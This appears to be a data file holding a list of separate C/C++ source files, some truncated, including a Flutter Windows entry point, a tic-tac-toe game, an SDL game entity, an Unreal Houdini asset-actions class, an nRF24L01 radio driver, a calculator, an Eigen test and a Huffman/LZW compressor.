    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_background_services_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include<vector>\r\nusing namespace std;\r\n\r\nvoid board(vector<string>arr){\r\n    cout<<endl;\r\n    cout<<\"  \"<<arr[1]<<\"  |  \"<<arr[2]<<\"  |  \"<<arr[3]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |   \"<<endl;\r\n    cout<<\"  \"<<arr[4]<<\"  |  \"<<arr[5]<<\"  |  \"<<arr[6]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |   \"<<endl;\r\n    cout<<\"  \"<<arr[7]<<\"  |  \"<<arr[8]<<\"  |  \"<<arr[9]<<\"  \"<<endl;\r\n    cout<<endl;\r\n}\r\n\r\nbool checkmove(int m,vector<string>arr){\r\n    if (m<=0 && m>=10)\r\n    {\r\n        return false;\r\n    }\r\n    if (arr[m]==\"X\" || arr[m]==\"O\")\r\n    {\r\n        return false;\r\n    }\r\n    return true;\r\n}\r\n\r\nvoid validmove(int move,string s,vector<string>&arr){\r\n    arr[move]=s;\r\n}\r\n\r\nstring wincheck(string s,vector<string>arr){\r\n    if((arr[1]==s&&arr[2]==s&&arr[3]==s)||(arr[4]==s&&arr[5]==s&&arr[6]==s)||(arr[7]==s&&arr[8]==s&&arr[9]==s)||(arr[1]==s&&arr[4]==s&&arr[7]==s)||(arr[2]==s&&arr[5]==s&&arr[8]==s)||(arr[3]==s&&arr[6]==s&&arr[9]==s)||(arr[1]==s&&arr[5]==s&&arr[9]==s)||(arr[3]==s&&arr[5]==s&&arr[7]==s)){\r\n            return s;\r\n        }\r\n        return \"0\";\r\n\r\n}\r\nint main(){\r\n    vector<string>arr(10);\r\n    for(int i=1;i<10;i++){\r\n        arr[i]=to_string(i);\r\n    }\r\n\r\n    \r\n    \r\n    char game;\r\n    cout<<\"press any key to start the game or q to quit\"<<endl;\r\n    cin>>game;\r\n\r\n    while (game!='q')\r\n    {\r\n        board(arr);                     // print board\r\n\r\n        int count=0,P1=0,P2=0;\r\n        while (count<10)              // if box is empty run loop\r\n        {\r\n            int move;\r\n            cout<<\"Player 1 turn..\"<<endl;\r\n            cout<<\"enter move: \";cin>>move;\r\n\r\n            while (!checkmove(move,arr))                        // check eithr move is available or not\r\n            {\r\n                cout<<\"wrong move Player 1, try again..\"<<endl;\r\n                cin>>move;\r\n            }\r\n\r\n            validmove(move,\"X\",arr);             // player 1 move\r\n\r\n            if (wincheck(\"X\",arr)==\"X\")\r\n            {\r\n                P1=1;\r\n                break;\r\n            }\r\n\r\n            count+=1;                  // box filled\r\n            //cout<<count<<endl;\r\n            if (count==9)\r\n            {\r\n                break;\r\n            }\r\n            \r\n            board(arr);\r\n            //////////////////////////////////////////////////////////////\r\n\r\n            cout<<\"Player 2 turn..\"<<endl;\r\n            cout<<\"enter move: \";cin>>move;\r\n\r\n            while (!checkmove(move,arr))                        // check eithr move is available or not\r\n            {\r\n                cout<<\"wrong move Player 2, try again..\"<<endl;\r\n                cin>>move;\r\n            }\r\n\r\n            validmove(move,\"O\",arr);             // player 2 move\r\n\r\n            if (wincheck(\"O\",arr)==\"O\")\r\n            {\r\n                P2=1;\r\n                break;\r\n            }\r\n\r\n            count+=1;                  // box filled\r\n            board(arr);\r\n        }\r\n        \r\n        board(arr);\r\n        if (P1==1)\r\n        {\r\n            cout<<\"Player 1 won..\"<<endl;\r\n        }\r\n        else if (P2==1)\r\n        {\r\n            cout<<\"Player 2 won..\"<<endl;\r\n        }\r\n        else{\r\n            cout<<\"game draw..\"<<endl;\r\n        }\r\n\r\n        for(int i=1;i<10;i++){\r\n            arr[i]=to_string(i);\r\n        }\r\n        cout<<\"press any key to play again or q to quit\"<<endl;\r\n        cin>>game;\r\n    }\r\n    \r\n    \r\n}",
    "#include \"Block.hpp\"\n\nBlock::Block(float px, float py, SDL_Texture* ptex, bool pFalling)\n    :Entity{px, py, ptex, pFalling}\n{\n        setType(1);\n}\n\n//Update function.\nvoid Block::update()\n{\n        setY(getY() + getVelY());\n        setY(clamp(getY(), -96, 672));\n\n        if(getY() == 672)\n        {\n            setFalling(false); \n            setVelY(0);\n        }\n\n        if(getFalling())\n        {\n            setVelY(6);\n        }\n}\n\n//Render function.\nvoid Block::render(SDL_Renderer* renderer)\n{\n        SDL_Rect src; \n        src.x = 0;\n        src.y = 0;\n        src.w = 32;\n        src.h = 32;\n\n        SDL_Rect dst;\n        dst.x = getX();\n        dst.y = getY();\n        dst.w = src.w * 3;\n        dst.h = src.h * 3;\n\n        SDL_RenderCopy(renderer, getTex(), &src, &dst);\n}\n\n//Hitboxes.\nSDL_Rect Block::getBounds()\n{\n        int width = 96; \n        int height = 96; \n\n        SDL_Rect rect; \n        rect.x = (int)(getX()+(width/2)-((width/2)/2))-19;\n        rect.y = (int)getY()+(height/2);\n        rect.w = width-11; \n        rect.h = height/2;\n\n        return rect; \n}\n\nSDL_Rect Block::getBoundsTop()\n{\n        int width = 96; \n        int height = 96; \n\n        SDL_Rect rect; \n        rect.x = (int)(getX()+(width/2)-((width/2)/2))-19;\n        rect.y = (int)getY();\n        rect.w = width-11; \n        rect.h = height/2; \n\n        return rect; \n}\n\nSDL_Rect Block::getBoundsLeft()\n{\n        int width = 96; \n        int height = 96; \n\n        SDL_Rect rect; \n        rect.x = getX();\n        rect.y = getY();\n        rect.w = 7; \n        rect.h = height; \n\n        return rect; \n}\n\nSDL_Rect Block::getBoundsRight()\n{\n        int width = 96; \n        int height = 96; \n\n        SDL_Rect rect; \n        rect.x = (int)getX()+width-7;\n        rect.y = (int)getY();\n        rect.w = 7; \n        rect.h = height; \n\n        return rect; \n}\n\n//Function to check collision.\nvoid Block::Collision(std::vector<Entity*> handler)\n{\n        bool onTop = false; \n\n        for(int i = 0; i < handler.size(); i++)\n        {\n            Entity* tempObject = handler[i];\n\n            if(tempObject->getType() == 1 && tempObject != this)\n            {\n                if(intersect(getBounds(), tempObject->getBoundsTop()))\n                {\n                    onTop = true;\n                    setY(tempObject->getY() - 96);\n                    setFalling(false);\n                    setVelY(0);\n                }\n            }\n        }\n\n        if(getY() != 672 || !onTop) setFalling(true);\n\n}",
    "/*\n* Copyright (c) <2018> Side Effects Software Inc.\n*\n* Permission is hereby granted, free of charge, to any person obtaining a copy\n* of this software and associated documentation files (the \"Software\"), to deal\n* in the Software without restriction, including without limitation the rights\n* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n* copies of the Software, and to permit persons to whom the Software is\n* furnished to do so, subject to the following conditions:\n*\n* The above copyright notice and this permission notice shall be included in all\n* copies or substantial portions of the Software.\n*\n* THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n* SOFTWARE.\n*\n*/\n#include \"HoudiniPointCacheAssetActions.h\"\n\n#include \"ToolMenus.h\"\n#include \"HoudiniPointCache.h\"\n#include \"EditorStyleSet.h\"\n#include \"Toolkits/AssetEditorToolkit.h\"\n#include \"EditorReimportHandler.h\"\n#include \"HAL/FileManager.h\"\n\n//#include \"HoudiniPointCacheAssetEditorToolkit.h\"\n\n#define LOCTEXT_NAMESPACE \"AssetTypeActions\"\n\n\nFHoudiniPointCacheAssetActions::FHoudiniPointCacheAssetActions()\n{ }\n\nbool FHoudiniPointCacheAssetActions::CanFilter()\n{\n    return true;\n}\n\n\nvoid FHoudiniPointCacheAssetActions::GetActions(const TArray<UObject*>& InObjects, FToolMenuSection& Section)\n{\n    FAssetTypeActions_Base::GetActions(InObjects, Section);\n\n    auto HoudiniPointCacheAssets = GetTypedWeakObjectPtrs<UHoudiniPointCache>(InObjects);\n\n    Section.AddMenuEntry(\n\t\t\"ReimportHoudiniPointCacheLabel\",\n\t\tLOCTEXT(\"ReimportHoudiniPointCacheLabel\", \"Reimport\"),\n\t\tLOCTEXT(\"ReimportHoudiniPointCacheTooltip\", \"Reimport the selected Houdini Point Cache file(s).\"),\n\t\tFSlateIcon(FAppStyle::GetAppStyleSetName(), \"ContentBrowser.AssetActions.ReimportAsset\"),\n\t\tFUIAction(\n\t\t\tFExecuteAction::CreateSP(this, &FHoudiniPointCacheAssetActions::ExecuteReimport, HoudiniPointCacheAssets),\n\t\t\tFCanExecuteAction::CreateSP(this, &FHoudiniPointCacheAssetActions::CanExecuteReimport, HoudiniPointCacheAssets)\n\t\t)\n    );\n\n    Section.AddMenuEntry(\n\t\t\"OpenHoudiniPointCacheLabel\",\n\t\tLOCTEXT(\"OpenHoudiniPointCacheLabel\", \"Open in Text Editor\"),\n\t\tLOCTEXT(\"OpenHoudiniPointCacheTooltip\", \"Open the selected Houdini Point Cache file(s) in a Text Editor.\"),\n\t\tFSlateIcon(FAppStyle::GetAppStyleSetName(), \"ContentBrowser.AssetActions.OpenInExternalEditor\"),\n\t\tFUIAction(\n\t\t\tFExecuteAction::CreateSP(this, &FHoudiniPointCacheAssetActions::ExecuteOpenInEditor, HoudiniPointCacheAssets),\n\t\t\tFCanExecuteAction::CreateSP(this, &FHoudiniPointCacheAssetActions::CanExecuteOpenInEditor, HoudiniPointCacheAssets)\n\t\t)\n    );\n\n\tSection.AddMenuEntry(\n\t\t\"FindHoudiniPointCacheInExplorer\",\n\t\tLOCTEXT(\"FindHoudiniPointCacheInExplorer\", \"Find Source File\"),\n\t\tLOCTEXT(\"FindHoudiniPointCacheInExplorerTooltip\", \"Opens explorer at the location of this asset's source file.\"),\n\t\tFSlateIcon(FAppStyle::GetAppStyleSetName(), \"ContentBrowser.AssetActions.OpenInExternalEditor\"),\n\t\tFUIAction(\n\t\t\tFExecuteAction::CreateSP(this, &FHoudiniPointCacheAssetActions::ExecuteFindInExplorer, HoudiniPointCacheAssets),\n\t\t\tFCanExecuteAction::CreateSP(this, &FHoudiniPointCacheAssetActions::CanExecuteFindInExplorer, HoudiniPointCacheAssets)\n\t\t)\n\t);\n}\n\n\nuint32 FHoudiniPointCacheAssetActions::GetCategories()\n{\n    return EAssetTypeCategories::Misc;\n}\n\n\nFText FHoudiniPointCacheAssetActions::GetName() const\n{\n    return NSLOCTEXT(\"AssetTypeActions\", \"AssetTypeActions_HoudiniPointCache\", \"Houdini Point Cache Asset\");\n}\n\n\nUClass* FHoudiniPointCacheAssetActions::GetSupportedClass() const\n{\n    return UHoudiniPointCache::StaticClass();\n}\n\nFText FHoudiniPointCacheAssetActions::GetAssetDescription(const FAssetData& AssetData) const\n{\n\t/*\n\tUHoudiniPointCache* PointCacheAsset = Cast<UHoudiniPointCache>(AssetData.GetAsset());\n\tif ( !PointCacheAsset )\n\t\treturn FText::GetEmpty();\n\n\tFString StrDescription;\n\tStrDescription += TEXT(\"Number of Rows: \") + FString::FromInt(PointCacheAsset->NumberOfRows) + TEXT(\"\\n\");\n\tStrDescription += TEXT(\"Number of Columns: \") + FString::FromInt(PointCacheAsset->NumberOfColumns) + TEXT(\"\\n\");\n\tStrDescription += TEXT(\"Number of Points: \") + FString::FromInt(PointCacheAsset->NumberOfPoints) + TEXT(\"\\n\");\n\n\treturn FText::FromString(StrDescription);\n\t*/\n\treturn FText::GetEmpty();\n}\n\n\nFColor FHoudiniPointCacheAssetActions::GetTypeColor() const\n{\n    //return FColor::Orange;\n\treturn FColor(255, 165, 0);\n}\n\n\nbool FHoudiniPointCacheAssetActions::HasActions(const TArray<UObject*>& InObjects) const\n{\n    return true;\n}\n\n\nclass UThumbnailInfo* FHoudiniPointCacheAssetActions::GetThumbnailInfo(UObject* Asset) const\n{",
    "#include \"MY_NRF24.h\"\n\n//*** Variables declaration ***//\n#define MAX(x, y) (((x) > (y)) ? (x) : (y))\n#define MIN(x, y) (((x) < (y)) ? (x) : (y))\n\n//**** Functions prototypes ****//\n//Microsecond delay function\nvoid NRF24L01::NRF24_DelayMicroSeconds(uint32_t uSec)\n{\n\tuint32_t uSecVar = uSec;\n\tuSecVar = uSecVar* ((SystemCoreClock/1000000)/3);\n\twhile(uSecVar--);\n}\n\nNRF24L01::NRF24L01(GPIO_TypeDef *nrf24PORTCSN, uint16_t nrfCSN_Pin,GPIO_TypeDef *nrf24PORTCE, uint16_t nrfCE_Pin, SPI_HandleTypeDef *nrfSPI)\n{\n\t//Copy SPI handle variable\n\tnrf24_hspi =  nrfSPI;\n\t//Copy Pins and Port variables\n\tnrf24_PORTCSN = nrf24PORTCSN;\n\tnrf24_CSN_PIN = nrfCSN_Pin;\n\tnrf24_PORTCE = nrf24PORTCE;\n\tnrf24_CE_PIN = nrfCE_Pin;\n}\n\n//Chip Select function\nvoid NRF24L01::NRF24_csn(int state)\n{\n\tif(state) HAL_GPIO_WritePin(nrf24_PORTCSN, nrf24_CSN_PIN, GPIO_PIN_SET);\n\telse HAL_GPIO_WritePin(nrf24_PORTCSN, nrf24_CSN_PIN, GPIO_PIN_RESET);\n}\n//Chip Enable\nvoid NRF24L01::NRF24_ce(int state)\n{\n\tif(state) HAL_GPIO_WritePin(nrf24_PORTCE, nrf24_CE_PIN, GPIO_PIN_SET);\n\telse HAL_GPIO_WritePin(nrf24_PORTCE, nrf24_CE_PIN, GPIO_PIN_RESET);\n}\n//Read single byte from a register\nuint8_t NRF24L01::NRF24_read_register(uint8_t reg)\n{\n\tuint8_t spiBuf[3];\n\tuint8_t retData;\n\t//Put CSN low\n\tNRF24_csn(0);\n\t//Transmit register address\n\tspiBuf[0] = reg&0x1F;\n\tHAL_SPI_Transmit(nrf24_hspi, spiBuf, 1, 100);\n\t//Receive data\n\tHAL_SPI_Receive(nrf24_hspi, &spiBuf[1], 1, 100);\n\tretData = spiBuf[1];\n\t//Bring CSN high\n\tNRF24_csn(1);\n\treturn retData;\n}\n//Read multiple bytes register\nvoid NRF24L01::NRF24_read_registerN(uint8_t reg, uint8_t *buf, uint8_t len)\n{\n\tuint8_t spiBuf[3];\n\t//Put CSN low\n\tNRF24_csn(0);\n\t//Transmit register address\n\tspiBuf[0] = reg&0x1F;\n\t//spiStatus = NRF24_SPI_Write(spiBuf, 1);\n\tHAL_SPI_Transmit(nrf24_hspi, spiBuf, 1, 100);\n\t//Receive data\n\tHAL_SPI_Receive(nrf24_hspi, buf, len, 100);\n\t//Bring CSN high\n\tNRF24_csn(1);\n}\n//Write single byte register\nvoid NRF24L01::NRF24_write_register(uint8_t reg, uint8_t value)\n{\n\tuint8_t spiBuf[3];\n\t//Put CSN low\n\tNRF24_csn(0);\n\t//Transmit register address and data\n\tspiBuf[0] = reg|0x20;\n\tspiBuf[1] = value;\n\tHAL_SPI_Transmit(nrf24_hspi, spiBuf, 2, 100);\n\t//Bring CSN high\n\tNRF24_csn(1);\n}\n//Write multipl bytes register\nvoid NRF24L01::NRF24_write_registerN(uint8_t reg, const uint8_t* buf, uint8_t len)\n{\n\tuint8_t spiBuf[3];\n\t//Put CSN low\n\tNRF24_csn(0);\n\t//Transmit register address and data\n\tspiBuf[0] = reg|0x20;\n\tHAL_SPI_Transmit(nrf24_hspi, spiBuf, 1, 100);\n\tHAL_SPI_Transmit(nrf24_hspi, (uint8_t*)buf, len, 100);\n\t//Bring CSN high\n\tNRF24_csn(1);\n}\n//Write transmit payload\nvoid NRF24L01::NRF24_write_payload(uint8_t* buf, uint8_t len)\n{\n\tuint8_t wrPayloadCmd;\n\t//Bring CSN low\n\tNRF24_csn(0);\n\t//Send Write Tx payload command followed by pbuf data\n\twrPayloadCmd = CMD_W_TX_PAYLOAD;\n\tHAL_SPI_Transmit(nrf24_hspi, &wrPayloadCmd, 1, 100);\n\tHAL_SPI_Transmit(nrf24_hspi, (uint8_t *)buf, len, 100);\n\t//Bring CSN high\n\tNRF24_csn(1);\n}\n//Read receive payload\nvoid NRF24L01::NRF24_read_payload(uint8_t* buf, uint8_t len)\n{\n\tuint8_t cmdRxBuf;\n\t//Get data length using payload size\n\tuint8_t data_len = MIN(len, NRF24_getPayloadSize());\n\t//Read data from Rx payload buffer\n\tNRF24_csn(0);\n\tcmdRxBuf = CMD_R_RX_PAYLOAD;\n\tHAL_SPI_Transmit(nrf24_hspi, &cmdRxBuf, 1, 100);\n\tHAL_SPI_Receive(nrf24_hspi, buf, data_len, 100);\n\tNRF24_csn(1);\n}\n\n//Flush Tx buffer\nvoid NRF24L01::NRF24_flush_tx(void)\n{\n\tNRF24_write_register(CMD_FLUSH_TX, 0xFF);\n}\n//Flush Rx buffer\nvoid NRF24L01::NRF24_flush_rx(void)\n{\n\tNRF24_write_register(CMD_FLUSH_RX, 0xFF);\n}\n//Get status register value\nuint8_t NRF24L01::NRF24_get_status(void)\n{\n\tuint8_t statReg;\n\tstatReg = NRF24_read_register(REG_STATUS);\n\treturn statReg;\n}\n\n//Begin function\nvoid NRF24L01::NRF24_begin(void)\n{\t\n\t//Put pins to idle state\n\tNRF24_csn(1);\n\tNRF24_ce(0);\n\t\n\t//**** Soft Reset Registers default values ****//\n\tNRF24_write_register(0x00, 0x08);\n\tNRF24_write_register(0x01, 0x3f);\n\tNRF24_write_register(0x02, 0x03);\n\tNRF24_write_register(0x03, 0x03);\n\tNRF24_write_register(0x04, 0x03);\n\tNRF24_write_register(0x05, 0x02);\n\tNRF24_write_register(0x06, 0x0f);\n\tNRF24_write_register(0x07, 0x0e);\n\tNRF24_write_register(0x08, 0x00);\n\tNRF24_write_register(0x09, 0x00);\n\tuint8_t pipeAddrVar[6];\n\tpipeAddrVar[4]=0xE7; pipeAddrVar[3]=0xE7; pipeAddrVar[2]=0xE7; pipeAddrVar[1]=0xE7; pipeAddrVar[0]=0xE7; \n\tNRF24_write_registerN(0x0A, pipeAddrVar, 5);\n\tpipeAddrVar[4]=0xC2; pipeAddrVar[3]=0xC2; pipeAddrVar[2]=0xC2; pipeAddrVar[1]=0xC2; pipeAddrVar[0]=0xC2; \n\tNRF24_write_registerN(0x0B, pipeAddrVar, 5);\n\tNRF24_write_register(0x0C, 0xC3);\n\tNRF24_write_register(0x0D, 0xC4);\n\tNRF24_write_register(0x0E, 0xC5);\n\tNRF24_write_register(0x0F, 0xC6);\n\tpipeAddrVar[4]=0xE7; pipeAddrVar[3]=0xE7; pipeAddrVar[2]=0xE7; pipeAddrVar[1]=0xE7; pipeAddrVar[0]=0xE7; \n\tNRF24_write_registerN(0x10, pipeAddrVar, 5);\n\tNRF24_write_register(0x11, 0);\n\tNRF24_write_register(0x12, 0);\n\tNRF24_write_register(0x13, 0);\n\tNRF24_write_register(0x14, 0);\n\tNRF24_write_register(0x15, 0)",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nclass Calc\r\n{\r\npublic:\r\n    int a, b, c;\r\n    char op;\r\n\r\n    void getValue1();\r\n    void getValue2();\r\n    void getOperator();\r\n    void add();\r\n    void sub();\r\n    void mul();\r\n    void div();\r\n};\r\n\r\nint main()\r\n{\r\n\r\n    Calc obj;\r\n    obj.getValue1();\r\n\r\n    while (1)\r\n    {\r\n        obj.getOperator();\r\n        if (obj.op == '=')\r\n        {\r\n            cout << \"Final Answer : \" << obj.a<<\"\\n\";\r\n            break;\r\n        }\r\n\r\n        obj.getValue2();\r\n\r\n        if (obj.op == '+')\r\n        {\r\n            obj.add();\r\n        }\r\n        else if (obj.op == '-')\r\n        {\r\n            obj.sub();\r\n        }\r\n        else if (obj.op == '*')\r\n        {\r\n            obj.mul();\r\n        }\r\n        else if (obj.op == '/')\r\n        {\r\n            obj.div();\r\n        }\r\n        else\r\n        {\r\n            cout << \"This Operation is not available\"<<\"\\n\";\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nvoid Calc ::getValue1()\r\n{\r\n    cout << \"Enter the Value : \";\r\n    cin >> a;\r\n}\r\n\r\nvoid Calc ::getValue2()\r\n{\r\n    cout << \"Enter the Value : \";\r\n    cin >> b;\r\n}\r\n\r\nvoid Calc ::getOperator()\r\n{\r\n    cout << \"Enter the Operator : \";\r\n    cin >> op;\r\n}\r\n\r\nvoid Calc ::add()\r\n{\r\n    c = a + b;\r\n    cout << a << \"+\" << b << \" = \" << c<<\"\\n\";\r\n    a = c;\r\n    b = 0;\r\n}\r\n\r\nvoid Calc ::sub()\r\n{\r\n    c = a - b;\r\n    cout << a << \"-\" << b << \" = \" << c<<\"\\n\";\r\n    a = c;\r\n    b = 0;\r\n}\r\n\r\nvoid Calc ::mul()\r\n{\r\n    c = a * b;\r\n    cout << a << \"*\" << b << \" = \" << c<<\"\\n\";\r\n    a = c;\r\n    b = 0;\r\n}\r\n\r\nvoid Calc ::div()\r\n{\r\n    c = a / b;\r\n    cout << a << \"/\" << b << \" = \" << c<<\"\\n\";\r\n    a = c;\r\n    b = 0;\r\n}",
    "// This file is part of Eigen, a lightweight C++ template library\r\n// for linear algebra.\r\n//\r\n// Copyright (C) 2019 Gael Guennebaud <gael.guennebaud@inria.fr>\r\n//\r\n// This Source Code Form is subject to the terms of the Mozilla\r\n// Public License v. 2.0. If a copy of the MPL was not distributed\r\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\r\n\r\n#define TEST_ENABLE_TEMPORARY_TRACKING\r\n\r\n#include \"main.h\"\r\n\r\ntypedef NestByValue<MatrixXd> CpyMatrixXd;\r\ntypedef CwiseBinaryOp<internal::scalar_sum_op<double,double>,const CpyMatrixXd,const CpyMatrixXd> XprType;\r\n\r\nXprType get_xpr_with_temps(const MatrixXd& a)\r\n{\r\n  MatrixXd t1 = a.rowwise().reverse();\r\n  MatrixXd t2 = a+a;\r\n  return t1.nestByValue() + t2.nestByValue();\r\n}\r\n\r\nEIGEN_DECLARE_TEST(nestbyvalue)\r\n{\r\n  for(int i = 0; i < g_repeat; i++) {\r\n    Index rows = internal::random<Index>(1,EIGEN_TEST_MAX_SIZE);\r\n    Index cols = internal::random<Index>(1,EIGEN_TEST_MAX_SIZE);\r\n    MatrixXd a = MatrixXd(rows,cols);\r\n    nb_temporaries = 0;\r\n    XprType x = get_xpr_with_temps(a);\r\n    VERIFY_IS_EQUAL(nb_temporaries,6);\r\n    MatrixXd b = x;\r\n    VERIFY_IS_EQUAL(nb_temporaries,6+1);\r\n    VERIFY_IS_APPROX(b, a.rowwise().reverse().eval() + (a+a).eval());\r\n  }\r\n}\r\n",
    "\ufeff#include <iostream>\n#include <fstream>\n#include <string>\n#include <map>\n#include <vector>\n#include <bitset>\n#include <cstdlib>\n#include <algorithm>\n#include \"HaffmanTree.h\"\n\nusing namespace std;\n\n// text\nstring text = \"\";\n\n// Haffman\nmap<char, int> symbols;\nHaffmanTree haffmanTree = HaffmanTree();\nmap<char, string> haffmanTable;\nstring haffmanText;\n\n// LZW\nmap<string, int> LZWCodeTable;\nmap<int, string> LZWEncodeTable;\nvector<int> LZWText;\n\nvoid FileInput() {\n\tchar symbol;\n\tstring line;\n\tifstream in(\"input.txt\");\n\tif (in.is_open()) {\n\t\twhile (getline(in, line)) {\n\t\t\tline += \"\\n\";\n\t\t\ttext += line;\n\t\t\tfor (int i = 0; i < line.size(); i++) {\n\t\t\t\tsymbol = line[i];\n\t\t\t\tif (symbols.contains(symbol)) {\n\t\t\t\t\tsymbols[symbol]++;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tsymbols[symbol] = 1;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tin.close();\n}\n\nvoid TranslateInHaffmanText() {\n\tif (!text.size()) return;\n\tchar symbol;\n\tfor (int i = 0; i < text.size(); i++) {\n\t\tsymbol = text[i];\n\t\thaffmanText += haffmanTable[symbol];\n\t}\n}\n\nvoid TranslateInLZWText() {\n\tif (!text.size()) return;\n\tfor (int i = 0; i < 256; i++) {\n\t\tstring s = \"\";\n\t\ts += char(i);\n\t\tLZWCodeTable[s] = i;\n\t}\n\tint code = 256;\n\tstring str = \"\", ch = \"\";\n\tstr += text[0];\n\tfor (int i = 1; i < text.size(); i++) {\n\t\tch += text[i];\n\t\tif (LZWCodeTable.find(str + ch) != LZWCodeTable.end()) {\n\t\t\tstr += ch;\n\t\t}\n\t\telse {\n\t\t\tLZWText.push_back(LZWCodeTable[str]);\n\t\t\tLZWCodeTable[str + ch] = code;\n\t\t\tcode++;\n\t\t\tstr = ch;\n\t\t}\n\t\tch = \"\";\n\t}\n\tLZWText.push_back(LZWCodeTable[str]);\n\t//LZWCodeTable.clear(); // \u0441\u043c. OutputOfAlgorithms\n}\n\nvoid TranslateFromHaffmanText() {\n\tif (!haffmanText.size()) return;\n\tstring code;\n\tfor (int i = 0; i < haffmanText.size(); i++) {\n\t\tcode += haffmanText[i];\n\t\tfor (const auto& element : haffmanTable) {\n\t\t\tif (element.second == code) {\n\t\t\t\ttext += element.first;\n\t\t\t\tcode = \"\";\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid TranslateFromLZWText() {\n\tif (!LZWText.size()) return;\n\tfor (int i = 0; i < 256; i++) {\n\t\tstring s = \"\";\n\t\ts += char(i);\n\t\tLZWEncodeTable[i] = s;\n\t}\n\tint code = 256, old = LZWText[0], n;\n\tstring str = LZWEncodeTable[old], ch = \"\";\n\tch += str[0];\n\ttext += str;\n\tfor (int i = 0; i < LZWText.size() - 1; i++) {\n\t\tn = LZWText[i + 1];\n\t\tif (LZWEncodeTable.find(n) == LZWEncodeTable.end()) {\n\t\t\tstr = LZWEncodeTable[old];\n\t\t\tstr += ch;\n\t\t}\n\t\telse {\n\t\t\tstr = LZWEncodeTable[n];\n\t\t}\n\t\ttext += str;\n\t\tch = \"\";\n\t\tch += str[0];\n\t\tLZWEncodeTable[code] = LZWEncodeTable[old] + ch;\n\t\tcode++;\n\t\told = n;\n\t}\n\t//LZWEncodeTable.clear(); // \u0441\u043c. OutputOfAlgorithms\n}\n\nvoid SerializeHaffmanTable(ofstream& out) {\n\tint codeLength;\n\tint tableSize = haffmanTable.size();\n\tout.write((char*)&tableSize, sizeof(int));\n\tfor (const auto& element : haffmanTable) {\n\t\tcodeLength = element.second.size();\n\t\tout << element.first;\n\t\tout.write((char*)&codeLength, sizeof(char));\n\t\tout << element.second;\n\t}\n}\n\nvoid SerializeHaffmanText(ofstream& out) {\n\tstring t;\n\tint endInd, extraZerosVol = 0;\n\tfor (int i = 0; i < haffmanText.size(); i += 8) {\n\t\tt = \"\";\n\t\tendInd = i + 8;\n\t\tif (endInd >= haffmanText.size()) {\n\t\t\textraZerosVol = endInd - haffmanText.size();\n\t\t\tendInd = haffmanText.size();\n\t\t}\n\t\tfor (int j = i; j < endInd; j++) {\n\t\t\tt += haffmanText[j];\n\t\t}\n\t\tout << (unsigned char)bitset<8> { t }.to_ulong();\n\t}\n\tout.write((char*)&extraZerosVol, sizeof(char));\n}\n\nvoid SerializeLZWText(ofstream& out) {\n\tfor (int i = 0; i < LZWText.size(); i++) {\n\t\tout.write((char*)&LZWText[i], sizeof(short));\n\t}\n}\n\nvoid FileOutputHaffman() {\n\tofstream out(\"output_haffman.txt\", ios::binary | ios::out);\n\tif (out.is_open()) {\n\t\tSerializeHaffmanTable(out);\n\t\tSerializeHaffmanText(out);\n\t}\n\tout.close();\n}\n\nvoid FileOutputLZW() {\n\tofstream out(\"output_LZW.txt\", ios::binary | ios::out);\n\tif (out.is_open()) {\n\t\tSerializeLZWText(out);\n\t}\n\tout.close();\n}\n\ninline int SpliceBytesForSize(uint8_t const* data_ptr) {\n\treturn\n\t\t(data_ptr[3] << 24) |\n\t\t(data_ptr[2] << 16) |\n\t\t(data_ptr[1] << 8) |\n\t\tdata_ptr[0];\n}\n\nvoid DeserializeHaffmanTable(ifstream& in) {\n\tchar tableSizeArr[sizeof(int)];\n\tin.read(tableSizeArr, sizeof(int));\n\tint tableSize = SpliceBytesForSize((uint8_t const*)tableSizeArr);\n\tint i = 0;\n\tchar symbolArr[sizeof(char)];\n\tchar codeLengthArr[sizeof(char)];\n\tfor (int i = 0; i < tableSize; i++) {\n\t\tin.read(symbolArr, sizeof(char));\n\t\tchar symbol = symbolArr[0];\n\t\tin.read(codeLengthArr, sizeof(char));\n\t\tint codeLength = 